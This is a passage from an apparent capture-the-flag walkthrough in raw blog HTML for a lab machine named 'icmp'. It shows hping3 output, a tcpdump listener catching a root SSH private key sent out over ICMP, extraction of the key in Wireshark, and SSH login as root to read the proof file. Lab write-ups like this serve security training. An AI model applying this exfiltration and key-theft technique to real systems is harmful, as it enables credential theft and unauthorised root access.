</span></span><span style=display:flex><span>HPING 192.168.49.200 <span style=color:#f92672>(</span>ens160 192.168.49.200<span style=color:#f92672>)</span>: icmp mode set, <span style=color:#ae81ff>28</span> headers + <span style=color:#ae81ff>1416</span> data bytes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>main<span style=color:#f92672>]</span> memlockall<span style=color:#f92672>()</span>: Operation not supported
</span></span><span style=display:flex><span>Warning: can<span style=color:#960050;background-color:#1e0010>&#39;</span>t disable memory paging!
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>25397</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> rtt<span style=color:#f92672>=</span>61.6 ms
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>25460</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> rtt<span style=color:#f92672>=</span>61.4 ms
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>25639</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> rtt<span style=color:#f92672>=</span>61.1 ms
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>25839</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> rtt<span style=color:#f92672>=</span>61.0 ms
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>25890</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span> rtt<span style=color:#f92672>=</span>68.9 ms
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>26060</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> rtt<span style=color:#f92672>=</span>60.8 ms
</span></span><span style=display:flex><span>^C
</span></span><span style=display:flex><span>--- 192.168.49.200 hping statistic ---
</span></span><span style=display:flex><span><span style=color:#ae81ff>6</span> packets transmitted, <span style=color:#ae81ff>6</span> packets received, 0% packet loss
</span></span><span style=display:flex><span>round-trip min/avg/max <span style=color:#f92672>=</span> 60.8/62.5/68.9 ms
</span></span></code></pre></div><p>Before running the <code>hping3</code> command, we should run <code>tcpdump</code> to receive the contents of <code>/root/.ssh/id_rsa</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo tcpdump icmp -i tun0 -w ssh.pcap
</span></span></code></pre></div><p>The output is saved on <code>ssh.pcap</code>, which can be opened with <code>wireshark</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ wireshark ssh.pcap
</span></span><span style=display:flex><span>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>Then we create a file <code>id_rsa</code> from the <code>ssh.pcap</code>, change it&rsquo;s permissions and ssh as <code>root</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ chmod <span style=color:#ae81ff>600</span> id_rsa
</span></span><span style=display:flex><span>geobour98@kali:~$ ssh -i id_rsa root@192.168.200.218
</span></span><span style=display:flex><span>Linux icmp 4.19.0-11-amd64 <span style=color:#75715e>#1 SMP Debian 4.19.146-1 (2020-09-17) x86_64</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style=display:flex><span>the exact distribution terms <span style=color:#66d9ef>for</span> each program are described in the
</span></span><span style=display:flex><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style=display:flex><span>permitted by applicable law.
</span></span><span style=display:flex><span>Last login: Tue Sep  <span style=color:#ae81ff>6</span> 18:31:36 <span style=color:#ae81ff>2022</span> from 192.168.49.200
</span></span><span style=display:flex><span>root@icmp:~# id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>root@icmp:~# cat proof.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Proof of Concept (PoC image):
<img src=../../../pg/icmp/icmp.png alt="VulnNet: Node photo" style=width:700px;height:300px></p><ul class=post-tags><li><a href=https://geobour98.com/tags/linux/><strong>linux</strong></a></li><li><a href=https://geobour98.com/tags/web/><strong>web</strong></a><li><li><a href=https://geobour98.com/tags/searchsploit/><strong>searchsploit</strong></a></li><li><a href=https://geobour98.com/tags/python/><strong>python</strong></a><li><li><a href=https://geobour98.com/tags/rwx/><strong>rwx</strong></a></li><li><a href=https://geobour98.com/tags/sudo/><strong>sudo</strong></a></li><li><a href=https://geobour98.com/tags/hping3/><strong>hping3</strong></a></li><li><a href=https://geobour98.com/tags/tcpdump/><strong>tcpdump</strong></a></li><li><a href=https://geobour98.com/tags/icmp/><strong>icmp</strong></a></li><li><a href=https://geobour98.com/tags/wireshark/><strong>wireshark</strong></a></li><li><a href=https://geobour98.com/tags/pcap/><strong>pcap</strong></a></li><li><a href=https://geobour98.com/tags/exfiltration/><strong>exfiltration</strong></a><li></ul></div><footer class=post-footer></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://geobour98.com/>geobour98</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>